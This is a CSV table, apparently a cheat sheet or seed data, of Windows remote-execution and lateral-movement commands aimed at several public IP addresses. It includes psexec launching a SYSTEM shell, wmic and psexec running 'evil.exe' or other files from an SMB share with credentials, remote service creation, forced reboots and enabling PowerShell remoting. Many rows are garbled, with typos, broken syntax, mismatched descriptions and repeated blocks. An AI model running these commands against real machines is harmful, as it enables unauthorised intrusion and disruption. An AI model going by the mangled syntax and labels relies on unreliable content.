Exename,commandline,description,category
netsh.exe,netsh interface 104.210.48.12 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 104.210.48.12 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 104.210.48.12 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 104.210.48.12 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 104.210.48.12 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 104.210.48.12 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 104.210.48.12 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 104.210.48.12 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 104.210.48.12 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 104.210.48.12 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 104.210.48.12 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 104.210.48.12 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 104.210.48.12 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 104.210.48.12 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 104.210.48.12 \dir C:\local,Copy remote folder,WINDOWS REMOTING
reg.exe,reg add \\ 45.248.64.126 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 45.248.64.126 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 45.248.64.126 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 45.248.64.126 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 45.248.64.126 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 45.248.64.126 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 103.252.142.21 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 103.252.142.21 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 103.252.142.21 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 103.252.142.21 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 103.252.142.21 \dir C:\local,Copy remote folder,WINDOWS REMOTING
reg.exe,reg add \\ 43.229.95.19 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 43.229.95.19 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 43.229.95.19 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 43.229.95.19 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 43.229.95.19 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 43.229.95.19 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 43.229.95.19 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 43.229.95.19 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 43.229.95.19 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 43.229.95.19 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 43.229.95.19 \dir C:\local,Copy remote folder,WINDOWS REMOTING
at.exe,"at \\43.229.95.19 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
at.exe,"at \\43.229.95.19 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net share \\ 43.229.95.19,Shares of remote computer,WINDOWS REMOTING
net.exe,net time \\43.229.95.19,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 43.229.95.19,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net time \\142.93.221.91,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 142.93.221.91,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net use z: \\ 142.93.221.91 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 142.93.221.91 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
netsh.exe,netsh interface 142.93.221.91 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 142.93.221.91 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 142.93.221.91 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 142.93.221.91 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
